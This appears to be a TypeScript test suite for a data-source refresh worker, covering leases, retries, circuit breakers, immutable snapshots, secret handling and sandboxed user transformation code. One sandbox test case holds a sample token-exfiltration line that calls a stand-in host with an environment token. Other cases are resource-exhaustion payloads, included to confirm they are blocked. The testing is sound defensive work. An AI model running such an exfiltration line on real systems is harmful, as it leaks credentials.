    const updated = await sources.update(created.definition.sourceDefinitionId, command({ expectedDefinitionVersion: 1, configuration: { data: { value: 'new' } } }));
    expect(await second.claim('same-source-concurrent')).toBeNull();
    expect(await running).toBe('completed');
    expect(await prisma.sourceSnapshot.count()).toBe(0);
    expect(await store.ack(oldEvent!)).toBe(true);
    const newEvent = await second.claim('new-definition');
    expect(newEvent?.eventId).toBe(updated.eventId!);
    expect(await second.execute(newEvent!, signal())).toBe('completed');
    expect(await secondStore.ack(newEvent!)).toBe(true);
    expect((await reads.read(created.definition.sourceDefinitionId)).snapshot).toMatchObject({ data: { value: 'new' }, definitionVersion: 2, revision: 1 });
  });

  test('three failures open a durable circuit and a cooldown retry can recover', async () => {
    const created = await sources.create(command({ connectorType: 'failure', configuration: { data: { recovered: true }, failuresBeforeSuccess: 3 } }));
    let due = new Date();
    for (let attempt = 1; attempt <= 3; attempt++) {
      // Controlled dates exercise persisted retry scheduling; execute uses real time.
      const event = await claim(created.eventId, due);
      expect(event.attempts).toBe(attempt);
      expect(await worker.execute(event, signal())).toBe('failed');
      const saved = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } });
      expect(saved.consecutiveFailures).toBe(attempt);
      const pending = await prisma.outboxEvent.findUniqueOrThrow({ where: { eventId: event.eventId } });
      expect(pending.status).toBe('pending');
      expect(pending.claimToken).toBeNull();
      expect(pending.lastError).toBe(JSON.stringify({
        code: 'SOURCE_REFRESH_FAILED', correlationId: event.correlationId, eventId: event.eventId,
      }));
      due = pending.availableAt;
      if (attempt < 3) expect(saved.circuitOpenUntil).toBeNull();
      else {
        expect(saved.circuitOpenUntil).not.toBeNull();
        expect(saved.circuitOpenUntil!.getTime() - saved.lastAttemptAt!.getTime()).toBe(SOURCE_LIMITS.circuitCooldownMs);
        expect(due.getTime()).toBeGreaterThanOrEqual(saved.circuitOpenUntil!.getTime());
        expect(await second.claim('before-cooldown', new Date(saved.circuitOpenUntil!.getTime() - 1))).toBeNull();
        expect((await sources.refresh(created.definition.sourceDefinitionId)).eventId).toBe(event.eventId);
      }
    }
    await other.$disconnect(); await other.$connect();
    const recovered = await second.claim('after-cooldown', due);
    expect(recovered?.attempts).toBe(4);
    expect(await second.execute(recovered!, signal())).toBe('completed');
    expect(await secondStore.ack(recovered!)).toBe(true);
    const state = await reads.read(created.definition.sourceDefinitionId);
    expect(state.state).toMatchObject({ consecutiveFailures: 0, circuitOpenUntil: null });
    expect(state.snapshot).toMatchObject({ revision: 4, freshness: { state: 'fresh' }, data: { recovered: true } });
    expect(await prisma.sourceSnapshot.count()).toBe(4);
  });

  test('a stale lease cannot publish data and the current lease can recover exactly once', async () => {
    const created = await sources.create(command());
    const expired = await claim(created.eventId);
    await expect(worker.execute({ ...expired, payload: { sourceDefinitionId: randomUUID() } }, signal())).rejects.toThrow('OUTBOX_INVALID_PAYLOAD');
    expect(await prisma.sourceSnapshot.count()).toBe(0);
    const replacement = await secondStore.claim('replacement', new Date(expired.claimUntil!.getTime() + 1), { eventId: expired.eventId });
    expect(replacement?.claimToken).not.toBe(expired.claimToken);
    await expect(worker.execute(expired, signal())).rejects.toThrow('SOURCE_STALE_CLAIM');
    expect(await prisma.sourceSnapshot.count()).toBe(0);
    expect(await prisma.outboxEffect.count()).toBe(0);
    expect(await second.execute(replacement!, signal())).toBe('completed');
    expect(await secondStore.ack(replacement!)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
    expect(await store.ack(expired)).toBe(false);
  });

  test('transport dead-letter without connector execution cannot strand future source refreshes', async () => {
    const created = await sources.create(command());
    let due = new Date();
    for (let attempt = 1; attempt <= 5; attempt++) {
      const event = await claim(created.eventId, due);
      expect(event.attempts).toBe(attempt);
      expect(await store.fail(event, 'OUTBOX_TRANSPORT_FAILED', due, () => 0)).toBe(true);
      const failed = await prisma.outboxEvent.findUniqueOrThrow({ where: { eventId: event.eventId } });
      due = failed.availableAt;
      expect(failed.status).toBe(attempt < 5 ? 'pending' : 'dead-letter');
    }
    expect(await prisma.sourceSnapshot.count()).toBe(0);
    const source = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } });
    expect(source.lastAttemptAt).toBeNull();
    const nextDue = new Date(Math.max(due.getTime(), source.nextRefreshAt.getTime()) + 1);
    await second.schedule(nextDue);
    const pending = await prisma.outboxEvent.findMany({ where: { aggregateId: source.sourceDefinitionId, status: 'pending' } });
    expect(pending).toHaveLength(1);
    expect(pending[0].eventId).not.toBe(created.eventId!);
    expect(pending[0].attempts).toBe(0);
    const recovered = await second.claim('next-source-period', nextDue);
    expect(recovered?.eventId).toBe(pending[0].eventId);
    expect(await second.execute(recovered!, signal())).toBe('completed');
    expect(await secondStore.ack(recovered!)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
  });

  test('snapshot failure rolls back definition progress and outbox effects in the same transaction', async () => {
    const created = await sources.create(command());
    const event = await claim(created.eventId);
    await prisma.$executeRawUnsafe(`CREATE TRIGGER test_reject_source_effect BEFORE INSERT ON outbox_effects
      BEGIN SELECT RAISE(ABORT, 'TEST_SOURCE_EFFECT_FAILURE'); END`);
    await expect(worker.execute(event, signal())).rejects.toMatchObject({ code: 'P2003' });
    expect(await prisma.sourceSnapshot.count()).toBe(0);
    expect(await prisma.outboxEffect.count()).toBe(0);
    expect(await prisma.sourceDefinition.findUnique({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } })).toMatchObject({
      snapshotRevision: 0, latestSnapshotId: null, latestValidSnapshotId: null, lastSuccessAt: null,
    });
    expect(await prisma.sourceRefreshJob.findUnique({ where: { eventId: event.eventId } })).toMatchObject({ completedAt: null });
    expect(await store.current(event)).not.toBeNull();
    await prisma.$executeRawUnsafe('DROP TRIGGER test_reject_source_effect');
    expect(await worker.execute(event, signal())).toBe('completed');
    expect(await store.ack(event)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
  });

  test.each(['fixture', 'failure'])('lease expiry during %s persistence rolls back snapshot, fallback pointer and effects', async connectorType => {
    const { id, row } = await executeFresh();
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, connectorType, configuration: { data: { value: 'second revision' } } }));
    const event = await claim(updated.eventId);
    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    // Deterministic DB fault injection after the first fenced write. Both the
    // snapshot and the lease mutation run inside the real SQLite transaction.
    await prisma.$executeRawUnsafe(`CREATE TRIGGER test_expire_source_lease AFTER INSERT ON source_snapshots
      BEGIN UPDATE outbox_events SET claim_until = 0 WHERE event_id = NEW.refresh_event_id; END`);
    await expect(worker.execute(event, signal())).rejects.toThrow('SOURCE_STALE_CLAIM');
    expect(await prisma.sourceSnapshot.count()).toBe(1);
    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
    expect(await prisma.sourceDefinition.findUnique({ where: { sourceDefinitionId: id } })).toEqual(original);
    expect(await prisma.sourceRefreshJob.findUnique({ where: { eventId: event.eventId } })).toMatchObject({ completedAt: null });
    expect(await prisma.outboxEffect.count({ where: { eventId: event.eventId } })).toBe(0);
    expect(await prisma.outboxEvent.findUnique({ where: { eventId: event.eventId } })).toMatchObject({
      status: 'processing', claimToken: event.claimToken, claimUntil: event.claimUntil,
    });
    await prisma.$executeRawUnsafe('DROP TRIGGER test_expire_source_lease');
    expect(await worker.execute(event, signal())).toBe(connectorType === 'fixture' ? 'completed' : 'failed');
    if (connectorType === 'fixture') expect(await store.ack(event)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(2);
    expect((await reads.read(id)).snapshot).toMatchObject({ revision: 2, freshness: { state: connectorType === 'fixture' ? 'fresh' : 'stale' } });
  });

  test('migration prevents snapshot mutation, foreign ownership and refresh-input mutation', async () => {
    const { id, row, event } = await executeFresh();
    await expect(Promise.resolve(prisma.$executeRaw`UPDATE source_snapshots SET data = '{}' WHERE snapshot_id = ${row.snapshotId}`)).rejects.toThrow('source_snapshot_immutable');
    await expect(Promise.resolve(prisma.$executeRaw`DELETE FROM source_snapshots WHERE snapshot_id = ${row.snapshotId}`)).rejects.toThrow('source_snapshot_immutable');
    await expect(Promise.resolve(prisma.$executeRaw`UPDATE source_refresh_jobs SET connector_type = 'failure' WHERE event_id = ${event.eventId}`)).rejects.toThrow('source_refresh_input_immutable');
    const foreign = await sources.create(command({ enabled: false }));
    // Clear the owner's unique pointers so uniqueness is not a substitute for the ownership guard.
    await prisma.sourceDefinition.update({ where: { sourceDefinitionId: id }, data: { latestSnapshotId: null, latestValidSnapshotId: null } });
    await expect(Promise.resolve(prisma.$executeRaw`UPDATE source_definitions SET latest_snapshot_id = ${row.snapshotId}
      WHERE source_definition_id = ${foreign.definition.sourceDefinitionId}`)).rejects.toThrow('source_snapshot_owner_mismatch');
    await expect(Promise.resolve(prisma.$executeRaw`UPDATE source_definitions SET latest_valid_snapshot_id = ${row.snapshotId}
      WHERE source_definition_id = ${foreign.definition.sourceDefinitionId}`)).rejects.toThrow('source_snapshot_owner_mismatch');
    const source = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    for (const field of ['latestSnapshotId', 'latestValidSnapshotId']) {
      await expect(Promise.resolve(prisma.sourceDefinition.create({ data: { ...source, configuration: source.configuration as Prisma.InputJsonObject,
        sourceDefinitionId: randomUUID(), [field]: row.snapshotId } }))).rejects.toMatchObject({ code: 'P2003' });
    }
    expect(await prisma.sourceDefinition.count()).toBe(2);
    await expect(reads.snapshot(foreign.definition.sourceDefinitionId, row.snapshotId)).rejects.toThrow('SOURCE_SNAPSHOT_NOT_FOUND');
    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
  });

  test('optimistic updates preserve or rotate secrets and failed updates leave no orphan secret', async () => {
    const created = await sources.create(command({ secret: `initial-${randomUUID()}` }));
    const id = created.definition.sourceDefinitionId;
    const initialRef = (await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).secretId!;
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1 }));
    expect(updated.definition.definitionVersion).toBe(2);
    expect(updated.definition.secretConfigured).toBe(true);
    await expect(sources.update(id, command({ expectedDefinitionVersion: 1, secret: `conflict-${randomUUID()}` }))).rejects.toThrow('SOURCE_VERSION_CONFLICT');
    expect(await prisma.sourceSecret.count()).toBe(1);
    const rotated = await sources.update(id, command({ expectedDefinitionVersion: 2, secret: `rotated-${randomUUID()}` }));
    expect(rotated.definition.secretConfigured).toBe(true);
    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).secretId).not.toBe(initialRef);
    expect(await prisma.sourceSecret.count()).toBe(2);
    const cleared = await sources.update(id, command({ expectedDefinitionVersion: 3, secret: null, enabled: false }));
    expect(cleared.definition.secretConfigured).toBe(false);
    expect(cleared.eventId).toBeNull();
    expect(await prisma.sourceSecret.count()).toBe(2);
    await expect(sources.refresh(id)).rejects.toThrow('SOURCE_DISABLED');
    expect(await prisma.outboxEvent.count({ where: { status: 'pending' } })).toBe(0);
  });

  test('WP-22 transforms only normalized data in a real child and never during API reads or commands', async () => {
    const initial = isolationDiagnostics().started;
    const secret = 'provider-' + randomUUID();
    const transformationCode = 'return { doubled: $.value * 2, inputKeys: Object.keys($).sort(), host: typeof process, configuration: typeof $.configuration };';
    const created = await sources.create(command({ secret, transformationCode, timeoutMs: 2500 }));
    const id = created.definition.sourceDefinitionId;
    expect(created.definition.transformationCode).toBe(transformationCode);
    expect((await reads.read(id)).snapshot).toBeNull();
    await reads.list();
    expect(isolationDiagnostics().started).toBe(initial);
    const event = await claim(created.eventId);
    expect(await worker.execute(event, signal())).toBe('completed');
    expect(await store.ack(event)).toBe(true);
    const state = await reads.read(id);
    expect(state.snapshot).toMatchObject({ freshness: { state: 'fresh' }, definitionVersion: 1,
      connectorVersion: 'builtin-fixture-v1+pure-js-v1',
      data: { doubled: 14, inputKeys: ['label', 'value'], host: 'undefined', configuration: 'undefined' } });
    expect(isolationDiagnostics()).toMatchObject({ started: initial + 1, active: 0, pending: 0, pids: [] });
    expect(JSON.stringify(state)).not.toContain(secret);
    expect(JSON.stringify(await prisma.outboxEvent.findMany())).not.toContain(transformationCode);
    await Promise.all(Array.from({ length: 10 }, () => reads.read(id)));
    expect(isolationDiagnostics().started).toBe(initial + 1);
  });

  test('WP-22 missing code preserves a definition, explicit null clears it, and invalid CAS has no effects', async () => {
    const created = await sources.create(command());
    const id = created.definition.sourceDefinitionId;
    expect(created.definition.transformationCode).toBeUndefined();
    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).transformationCode).toBeNull();
    const withCode = await sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode: 'return $.value;' }));
    expect(withCode.definition).toMatchObject({ definitionVersion: 2, transformationCode: 'return $.value;' });
    const kept = await sources.update(id, command({ expectedDefinitionVersion: 2 }));
    expect(kept.definition).toMatchObject({ definitionVersion: 3, transformationCode: 'return $.value;' });
    const before = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    const eventCount = await prisma.outboxEvent.count();
    await expect(sources.update(id, command({ expectedDefinitionVersion: 2, transformationCode: 'return "obsolete";' }))).rejects.toThrow('SOURCE_VERSION_CONFLICT');
    for (const transformationCode of [false, 42, [], {}, ' '.repeat(10_001)]) {
      await expect(sources.create(command({ transformationCode }))).rejects.toThrow('SOURCE_INVALID_COMMAND');
      await expect(sources.update(id, command({ expectedDefinitionVersion: 3, transformationCode }))).rejects.toThrow('SOURCE_INVALID_COMMAND');
    }
    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(before);
    expect(await prisma.outboxEvent.count()).toBe(eventCount);
    const cleared = await sources.update(id, command({ expectedDefinitionVersion: 3, transformationCode: null }));
    expect(cleared.definition.transformationCode).toBeUndefined();
    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).transformationCode).toBeNull();
    expect(await prisma.sourceDefinition.count()).toBe(1);
  });

  test('WP-22 rejects credential copies in new or preserved code and rolls back all writes', async () => {
    const secret = 'provider-"slash\\-' + randomUUID();
    const existing = await sources.create(command({ secret }));
    const id = existing.definition.sourceDefinitionId;
    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    const initialEvents = await prisma.outboxEvent.findMany();
    for (const transformationCode of ['// ' + secret + '\nreturn null;', 'return ' + JSON.stringify(secret) + ';']) {
      await expect(sources.create(command({ secret, transformationCode }))).rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
      for (const change of [{}, { secret: null }, { secret: 'replacement-' + randomUUID() }]) {
        await expect(sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode, ...change })))
          .rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
      }
    }
    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(original);
    expect(await prisma.outboxEvent.findMany()).toEqual(initialEvents);
    expect(await prisma.sourceSecret.count()).toBe(1);
    const futureSecret = 'future-secret-' + randomUUID();
    const codeOnly = await sources.create(command({ transformationCode: 'return ' + JSON.stringify(futureSecret) + ';', enabled: false }));
    await expect(sources.update(codeOnly.definition.sourceDefinitionId,
      command({ expectedDefinitionVersion: 1, secret: futureSecret, enabled: false }))).rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
    expect(await prisma.sourceSecret.count()).toBe(1);
    expect((await reads.read(codeOnly.definition.sourceDefinitionId)).definition.definitionVersion).toBe(1);
  });

  test.each([
    ['CPU loop', 'while(true){}', 'SOURCE_TIMEOUT'],
    ['aggregate heap', 'const a=[];for(let i=0;i<2000;i++)a.push(new Array(10000).fill(i));return a.length;', 'SOURCE_TRANSFORM_FAILED'],
    ['token exfiltration', 'return fetch("https://example.invalid/exfil?token="+process.env.PROVIDER_REFRESH_TOKEN);', 'SOURCE_TRANSFORM_FAILED'],
    ['serialization getter', 'return {get value(){while(true){}}};', 'SOURCE_TRANSFORM_FAILED'],
    ['custom prototype', 'return Object.create({secret:"untrusted"});', 'SOURCE_TRANSFORM_FAILED'],
  ])('WP-22 %s failure retains immutable last-good data and records a bounded retry', async (_name, transformationCode, errorCode) => {
    const { id, row } = await executeFresh({ secret: 'provider-' + randomUUID() });
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode, timeoutMs: 2500 }));
    const event = await claim(updated.eventId);
    const started = performance.now();
    expect(await worker.execute(event, signal())).toBe('failed');
    expect(performance.now() - started).toBeLessThan(3500);
    const state = await reads.read(id);
    expect(state.snapshot).toMatchObject({ revision: 2, definitionVersion: 2, freshness: { state: 'stale' },
      data: row.data, contentHash: row.contentHash, error: { code: errorCode, retryable: true } });
    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).latestValidSnapshotId).toBe(row.snapshotId);
    expect(await prisma.outboxEvent.findUnique({ where: { eventId: event.eventId } })).toMatchObject({
      status: 'pending', lastError: JSON.stringify({ code: errorCode,
        correlationId: event.correlationId, eventId: event.eventId }),
    });
    expect(await prisma.outboxEffect.count({ where: { eventId: event.eventId } })).toBe(0);
    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
  });

  test('WP-22 revalidates transformed data against the connector credential before persistence', async () => {
    const secret = 'synthetic-' + randomUUID();
    const { id, row } = await executeFresh({ secret });
    // The code reconstructs an output sentinel; no secret is sent through stdin.
    const middle = Math.floor(secret.length / 2);
    const transformationCode = 'return {value:' + JSON.stringify(secret.slice(0, middle)) + '+' + JSON.stringify(secret.slice(middle)) + '};';
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode, timeoutMs: 2500 }));
    const event = await claim(updated.eventId);
    expect(await worker.execute(event, signal())).toBe('failed');
    const snapshots = await prisma.sourceSnapshot.findMany();
    expect(JSON.stringify(snapshots)).not.toContain(secret);
    expect((await reads.read(id)).snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
      error: { code: 'SOURCE_TRANSFORM_FAILED' } });
  });

  test('WP-22 transformation retries open the circuit and stop after the fixed attempt budget', async () => {
    const { id, row } = await executeFresh();
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1,
      transformationCode: 'throw new Error("INTERNAL_ATTACK_SENTINEL");', timeoutMs: 2500 }));
    let due = new Date();
    for (let attempt = 1; attempt <= 5; attempt++) {
      const event = await claim(updated.eventId, due);
      expect(event.attempts).toBe(attempt);
      expect(await worker.execute(event, signal())).toBe('failed');
      const saved = await prisma.outboxEvent.findUniqueOrThrow({ where: { eventId: event.eventId } });
      expect(saved.status).toBe(attempt < 5 ? 'pending' : 'dead-letter');
      expect(saved.lastError).toBe(JSON.stringify({
        code: 'SOURCE_TRANSFORM_FAILED', correlationId: event.correlationId, eventId: event.eventId,
      }));
      due = saved.availableAt;
      const state = await reads.read(id);
      expect(state.snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
        error: { code: 'SOURCE_TRANSFORM_FAILED', retryable: attempt < 5 } });
      if (attempt >= 3) expect(state.state.circuitOpenUntil).not.toBeNull();
    }
    expect(await prisma.sourceSnapshot.count()).toBe(6);
    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
    expect(await prisma.sourceRefreshJob.findUnique({ where: { eventId: updated.eventId! } })).toMatchObject({ completedAt: expect.any(Date) });
    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
  }, 15_000);

  test('WP-22 connector and transformation share the source timeout', async () => {
    const { id, row } = await executeFresh();
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, connectorType: 'slow',
      configuration: { data: { value: 'late' }, delayMs: 700 }, timeoutMs: 1000, transformationCode: 'while(true){}' }));
    const started = performance.now(), before = isolationDiagnostics().started;
    expect(await worker.execute(await claim(updated.eventId), signal())).toBe('failed');
    const elapsed = performance.now() - started;
    expect(elapsed).toBeGreaterThanOrEqual(950);
    expect(elapsed).toBeLessThan(1350);
    expect(isolationDiagnostics()).toMatchObject({ started: before + 1, active: 0, pending: 0, pids: [] });
    expect((await reads.read(id)).snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
      error: { code: 'SOURCE_TIMEOUT' } });
  });

  test('WP-22 a version change during a child run fences stale transformation output', async () => {
    const { id, row } = await executeFresh();
    const old = await sources.update(id, command({ expectedDefinitionVersion: 1, timeoutMs: 2500,
      transformationCode: 'const until=Date.now()+500;while(Date.now()<until){};return {value:"obsolete"};' }));
    const oldEvent = await claim(old.eventId), running = worker.execute(oldEvent, signal());
    const deadline = Date.now() + 1000;
    while (isolationDiagnostics().active === 0 && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 5));
    expect(isolationDiagnostics().active).toBe(1);
    const current = await sources.update(id, command({ expectedDefinitionVersion: 2, timeoutMs: 2500,
      transformationCode: 'return {value:"current"};' }));
    expect(await running).toBe('completed');
    expect(await store.ack(oldEvent)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
    const currentEvent = await claim(current.eventId);
    expect(await worker.execute(currentEvent, signal())).toBe('completed');
    expect(await store.ack(currentEvent)).toBe(true);
    expect((await reads.read(id)).snapshot).toMatchObject({ revision: 2, definitionVersion: 3,
      data: { value: 'current' }, connectorVersion: 'builtin-fixture-v1+pure-js-v1' });
    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
  });

  test('WP-22 parent abort terminates a transformation before recording the stale attempt', async () => {
    const { id, row } = await executeFresh();
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, timeoutMs: 7500, transformationCode: 'while(true){}' }));
    const event = await claim(updated.eventId), parent = new AbortController();
    const running = worker.execute(event, parent.signal), deadline = Date.now() + 1000;
    while (isolationDiagnostics().active === 0 && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 5));
    expect(isolationDiagnostics().active).toBe(1);
    parent.abort();
    expect(await running).toBe('failed');
    expect((await reads.read(id)).snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
      error: { code: 'SOURCE_ABORTED' } });
    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
  });
});
